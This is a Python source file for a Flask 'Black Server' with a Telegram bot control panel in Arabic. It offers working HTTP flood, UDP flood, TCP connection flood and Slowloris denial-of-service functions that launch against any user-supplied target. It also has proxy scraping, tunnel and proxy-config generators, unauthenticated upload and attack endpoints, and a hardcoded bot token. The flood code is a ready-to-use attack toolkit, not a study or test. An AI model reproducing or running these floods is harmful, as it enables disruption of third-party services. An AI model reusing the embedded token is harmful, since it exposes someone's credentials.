import os
import threading
from flask import Flask, request, send_file, jsonify
from werkzeug.utils import secure_filename
import json
import time
import random
import hashlib
import base64
import requests
from concurrent.futures import ThreadPoolExecutor
import socket
import logging
import uuid

app = Flask(__name__)
UPLOAD_FOLDER = 'storage'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs('configs', exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class FileServer:
    def __init__(self):
        self.files = {}
        self.load_existing_files()
    
    def load_existing_files(self):
        for f in os.listdir(UPLOAD_FOLDER):
            path = os.path.join(UPLOAD_FOLDER, f)
            if os.path.isfile(path):
                self.files[f] = {'path': path, 'size': os.path.getsize(path), 'uploaded': os.path.getctime(path)}
    
    def add_file(self, filename, filepath):
        self.files[filename] = {'path': filepath, 'size': os.path.getsize(filepath), 'uploaded': time.time()}
    
    def get_file(self, filename):
        return self.files.get(filename)
    
    def list_files(self):
        return {k: {'size': v['size'], 'uploaded': v['uploaded']} for k, v in self.files.items()}
    
    def delete_file(self, filename):
        if filename in self.files:
            os.remove(self.files[filename]['path'])
            del self.files[filename]
            return True
        return False

file_server = FileServer()

class AttackTools:
    def __init__(self):
        self.active_attacks = {}
        self.executor = ThreadPoolExecutor(max_workers=100)
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        ]
    
    def http_flood(self, target, port, duration, threads=50):
        attack_id = hashlib.md5(f"{target}{time.time()}".encode()).hexdigest()[:8]
        self.active_attacks[attack_id] = {'target': target, 'type': 'HTTP', 'status': 'running'}
        def flood_worker():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((target, port))
                    payload = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(self.user_agents)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
                    sock.send(payload.encode())
                    time.sleep(0.01)
                    sock.close()
                except: pass
        for _ in range(threads):
            self.executor.submit(flood_worker)
        return attack_id
    
    def udp_flood(self, target, port, duration, threads=30):
        attack_id = hashlib.md5(f"udp{target}{time.time()}".encode()).hexdigest()[:8]
        self.active_attacks[attack_id] = {'target': target, 'type': 'UDP', 'status': 'running'}
        def udp_worker():
            end_time = time.time() + duration
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            while time.time() < end_time:
                try: sock.sendto(payload, (target, port))
                except: pass
        for _ in range(threads):
            self.executor.submit(udp_worker)
        return attack_id
    
    def tcp_syn(self, target, port, duration, threads=50):
        attack_id = hashlib.md5(f"syn{target}{time.time()}".encode()).hexdigest()[:8]
        self.active_attacks[attack_id] = {'target': target, 'type': 'SYN', 'status': 'running'}
        def syn_worker():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect_ex((target, port))
                    sock.close()
                except: pass
        for _ in range(threads):
            self.executor.submit(syn_worker)
        return attack_id
    
    def slowloris(self, target, port, duration, sockets_count=200):
        attack_id = hashlib.md5(f"slow{target}{time.time()}".encode()).hexdigest()[:8]
        self.active_attacks[attack_id] = {'target': target, 'type': 'Slowloris', 'status': 'running'}
        def slow_worker():
            sockets = []
            for _ in range(sockets_count):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, port))
                    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {target}\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0\r\n".encode())
                    s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
                    sockets.append(s)
                except: pass
            end_time = time.time() + duration
            while time.time() < end_time:
                for s in list(sockets):
                    try: s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    except: sockets.remove(s)
                time.sleep(15)
        self.executor.submit(slow_worker)
        return attack_id
    
    def stop_attack(self, attack_id):
        if attack_id in self.active_attacks:
            self.active_attacks[attack_id]['status'] = 'stopped'
            del self.active_attacks[attack_id]
            return True
        return False

attack_tools = AttackTools()

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.load_proxies()
    
    def load_proxies(self):
        sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
        ]
        for url in sources:
            try:
                resp = requests.get(url, timeout=10)
                proxies = resp.text.strip().split('\n')
                for p in proxies:
                    p = p.strip()
                    if p and ':' in p:
                        self.proxies.append({'http': f'http://{p}', 'https': f'http://{p}'})
            except: pass
        random.shuffle(self.proxies)
    
    def get_proxy(self):
        if not self.proxies: self.load_proxies()
        if not self.proxies: return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return proxy
    
    def test_proxy(self, proxy):
        try:
            resp = requests.get('http://httpbin.org/ip', proxies=proxy, timeout=5)
            return resp.status_code == 200
        except: return False

proxy_manager = ProxyManager()

class ConfigGenerator:
    def __init__(self):
        pass
    
    def generate_vless(self, server, port, uuid_val, network='ws', path='/'):
        return f"vless://{uuid_val}@{server}:{port}?type={network}&path={path}&encryption=none#{server}"
    
    def generate_vmess(self, server, port, uuid_val):
        config = {"v": "2", "ps": server, "add": server, "port": port, "id": uuid_val, "aid": "0", "scy": "auto", "net": "ws", "type": "none", "host": "", "path": "/", "tls": ""}
        encoded = base64.b64encode(json.dumps(config).encode()).decode()
        return f"vmess://{encoded}"
    
    def generate_trojan(self, server, port, password):
        return f"trojan://{password}@{server}:{port}?security=tls&type=tcp#{server}"
    
    def generate_shadowsocks(self, server, port, password, method='aes-256-gcm'):
        encoded = base64.b64encode(f"{method}:{password}".encode()).decode()
        return f"ss://{encoded}@{server}:{port}#{server}"
    
    def generate_socks(self, server, port, username='', password=''):
        if username and password: return f"socks5://{username}:{password}@{server}:{port}"
        return f"socks5://{server}:{port}"
    
    def generate_http_config(self, host, port):
        return f"CONNECT [host_port] [protocol][crlf]Host: {host}[crlf]X-Online-Host: {host}[crlf]Connection: Keep-Alive[crlf][crlf]"
    
    def generate_ssh(self, host, port, username, password):
        return json.dumps({"host": host, "port": port, "username": username, "password": password})
    
    def generate_wireguard(self, private_key, address, dns, public_key, endpoint, allowed_ips):
        return f"[Interface]\nPrivateKey = {private_key}\nAddress = {address}\nDNS = {dns}\n\n[Peer]\nPublicKey = {public_key}\nEndpoint = {endpoint}\nAllowedIPs = {allowed_ips}\nPersistentKeepalive = 25"

config_gen = ConfigGenerator()

class TunnelManager:
    def __init__(self):
        self.tunnels = {}
    
    def create_ssh_tunnel(self, ssh_host, ssh_port, ssh_user, ssh_pass, local_port, remote_host, remote_port):
        tunnel_id = hashlib.md5(f"tunnel{time.time()}".encode()).hexdigest()[:8]
        import paramiko
        def establish_tunnel():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ssh_host, ssh_port, ssh_user, ssh_pass)
                transport = client.get_transport()
                transport.request_port_forward('', local_port, (remote_host, remote_port))
                self.tunnels[tunnel_id] = {'client': client, 'status': 'active'}
                while True: time.sleep(60)
            except Exception as e:
                self.tunnels[tunnel_id] = {'status': 'failed', 'error': str(e)}
        threading.Thread(target=establish_tunnel, daemon=True).start()
        return tunnel_id

tunnel_manager = TunnelManager()

@app.route('/')
def index():
    return jsonify({'status': 'Black Server Active', 'endpoints': {'upload': '/upload', 'files': '/files', 'attack': '/attack', 'config': '/config', 'proxy': '/proxy', 'tunnel': '/tunnel'}})

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files: return jsonify({'error': 'No file'}), 400
    file = request.files['file']
    if file.filename == '': return jsonify({'error': 'No filename'}), 400
    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    file_server.add_file(filename, filepath)
    return jsonify({'status': 'uploaded', 'filename': filename, 'size': os.path.getsize(filepath), 'url': f'/download/{filename}'})

@app.route('/download/<filename>')
def download_file(filename):
    file_info = file_server.get_file(filename)
    if file_info: return send_file(file_info['path'], as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

@app.route('/files')
def list_files():
    return jsonify(file_server.list_files())

@app.route('/delete/<filename>', methods=['DELETE'])
def delete_file(filename):
    if file_server.delete_file(filename): return jsonify({'status': 'deleted'})
    return jsonify({'error': 'Not found'}), 404

@app.route('/attack', methods=['POST'])
def launch_attack():
    data = request.json
    target = data.get('target')
    port = int(data.get('port', 80))
    duration = int(data.get('duration', 60))
    method = data.get('method', 'http').lower()
    threads = int(data.get('threads', 30))
    if method == 'http': attack_id = attack_tools.http_flood(target, port, duration, threads)
    elif method == 'udp': attack_id = attack_tools.udp_flood(target, port, duration, threads)
    elif method == 'syn': attack_id = attack_tools.tcp_syn(target, port, duration, threads)
    elif method == 'slowloris': attack_id = attack_tools.slowloris(target, port, duration, threads)
    else: return jsonify({'error': 'Invalid method'}), 400
    return jsonify({'attack_id': attack_id, 'status': 'launched'})

@app.route('/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    if attack_tools.stop_attack(attack_id): return jsonify({'status': 'stopped'})
    return jsonify({'error': 'Not found'}), 404

@app.route('/attacks')
def list_attacks():
    return jsonify(attack_tools.active_attacks)

@app.route('/config/generate', methods=['POST'])
def generate_config():
    data = request.json
    protocol = data.get('protocol', 'vless')
    server = data.get('server', '')
    port = data.get('port', 443)
    if protocol == 'vless': config = config_gen.generate_vless(server, port, data.get('uuid', str(uuid.uuid4())), data.get('network', 'ws'), data.get('path', '/'))
    elif protocol == 'vmess': config = config_gen.generate_vmess(server, port, data.get('uuid', str(uuid.uuid4())))
    elif protocol == 'trojan': config = config_gen.generate_trojan(server, port, data.get('password', ''))
    elif protocol == 'shadowsocks': config = config_gen.generate_shadowsocks(server, port, data.get('password', ''), data.get('method', 'aes-256-gcm'))
    elif protocol == 'socks': config = config_gen.generate_socks(server, port, data.get('username', ''), data.get('password', ''))
    elif protocol == 'http': config = config_gen.generate_http_config(server, port)
    elif protocol == 'ssh': config = config_gen.generate_ssh(server, port, data.get('username', ''), data.get('password', ''))
    elif protocol == 'wireguard': config = config_gen.generate_wireguard(data.get('private_key', ''), data.get('address', ''), data.get('dns', '1.1.1.1'), data.get('public_key', ''), data.get('endpoint', ''), data.get('allowed_ips', '0.0.0.0/0'))
    else: return jsonify({'error': 'Unsupported protocol'}), 400
    config_filename = f"{protocol}_{server}_{int(time.time())}.txt"
    with open(f"configs/{config_filename}", 'w') as f: f.write(config)
    return jsonify({'protocol': protocol, 'config': config, 'saved_as': config_filename})

@app.route('/config/list')
def list_configs():
    return jsonify(os.listdir('configs'))

@app.route('/proxy')
def get_proxy():
    proxy = proxy_manager.get_proxy()
    if proxy: return jsonify({'proxy': proxy, 'tested': proxy_manager.test_proxy(proxy)})
    return jsonify({'error': 'No proxies available'}), 404

@app.route('/proxy/list')
def list_proxies():
    return jsonify({'total': len(proxy_manager.proxies), 'proxies': proxy_manager.proxies[:50]})

@app.route('/proxy/test')
def test_random_proxy():
    proxy = proxy_manager.get_proxy()
    if proxy: return jsonify({'proxy': proxy, 'working': proxy_manager.test_proxy(proxy)})
    return jsonify({'error': 'No proxy'}), 404

@app.route('/tunnel/create', methods=['POST'])
def create_tunnel():
    data = request.json
    tunnel_id = tunnel_manager.create_ssh_tunnel(data.get('ssh_host'), int(data.get('ssh_port', 22)), data.get('ssh_user'), data.get('ssh_pass'), int(data.get('local_port', 1080)), data.get('remote_host', '0.0.0.0'), int(data.get('remote_port', 1080)))
    return jsonify({'tunnel_id': tunnel_id, 'status': 'creating'})

@app.route('/tunnel/list')
def list_tunnels():
    return jsonify(tunnel_manager.tunnels)

def start_telegram_bot():
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
    
    TOKEN = '8942434562:AAEgIs6ANM2gwloPfUAj_NPPsteLYRNjRW4'
    
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("📁 رفع ملف", callback_data='upload')],
            [InlineKeyboardButton("📂 قائمة الملفات", callback_data='list_files')],
            [InlineKeyboardButton("⚔️ أدوات الرشق", callback_data='attack_menu')],
            [InlineKeyboardButton("🔧 توليد كونفج", callback_data='config_menu')],
            [InlineKeyboardButton("🌐 بروكسي", callback_data='proxy_menu')],
            [InlineKeyboardButton("🔗 الأنفاق", callback_data='tunnel_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text('⚡ Black Server Control Panel ⚡', reply_markup=reply_markup)
    
    async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        if query.data == 'upload': await query.edit_message_text("أرسل الملف لرفعه على السيرفر")
        elif query.data == 'list_files':
            files = file_server.list_files()
            await query.edit_message_text(f"الملفات:\n{json.dumps(files, indent=2)}")
        elif query.data == 'attack_menu':
            keyboard = [
                [InlineKeyboardButton("HTTP Flood", callback_data='attack_http')],
                [InlineKeyboardButton("UDP Flood", callback_data='attack_udp')],
                [InlineKeyboardButton("TCP SYN", callback_data='attack_syn')],
                [InlineKeyboardButton("Slowloris", callback_data='attack_slow')]
            ]
            await query.edit_message_text("اختر نوع الهجوم:", reply_markup=InlineKeyboardMarkup(keyboard))
        elif query.data == 'proxy_menu':
            proxy = proxy_manager.get_proxy()
            await query.edit_message_text(f"بروكسي:\n{proxy}")
        elif query.data == 'config_menu':
            await query.edit_message_text("استخدم API:\nPOST /config/generate\n{\n  \"protocol\":\"vless\",\n  \"server\":\"ip\",\n  \"port\":443\n}")
        elif query.data == 'tunnel_menu':
            await query.edit_message_text("استخدم API:\nPOST /tunnel/create\n{\n  \"ssh_host\":\"ip\",\n  \"ssh_port\":22,\n  \"ssh_user\":\"root\",\n  \"ssh_pass\":\"pass\"\n}")
        elif query.data.startswith('attack_'):
            attack_type = query.data.replace('attack_', '')
            context.user_data['attack_type'] = attack_type
            await query.edit_message_text(f"تم اختيار {attack_type}\nأرسل البيانات بالتنسيق:\ntarget:port:duration:threads")
    
    async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
        text = update.message.text
        if 'attack_type' in context.user_data:
            parts = text.split(':')
            if len(parts) >= 3:
                target = parts[0]
                port = int(parts[1])
                duration = int(parts[2])
                threads = int(parts[3]) if len(parts) > 3 else 30
                attack_type = context.user_data['attack_type']
                if attack_type == 'http': aid = attack_tools.http_flood(target, port, duration, threads)
                elif attack_type == 'udp': aid = attack_tools.udp_flood(target, port, duration, threads)
                elif attack_type == 'syn': aid = attack_tools.tcp_syn(target, port, duration, threads)
                elif attack_type == 'slow': aid = attack_tools.slowloris(target, port, duration, threads)
                await update.message.reply_text(f"✅ تم بدء الهجوم\nID: {aid}")
            else:
                await update.message.reply_text("صيغة خاطئة. استخدم:\ntarget:port:duration:threads")
            del context.user_data['attack_type']
    
    async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
        file = await update.message.document.get_file()
        filename = update.message.document.file_name
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        await file.download_to_drive(filepath)
        file_server.add_file(filename, filepath)
        await update.message.reply_text(f"✅ تم رفع {filename}")
    
    app_bot = Application.builder().token(TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CallbackQueryHandler(button_handler))
    app_bot.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    threading.Thread(target=app_bot.run_polling, daemon=True).start()

if __name__ == '__main__':
    start_telegram_bot()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)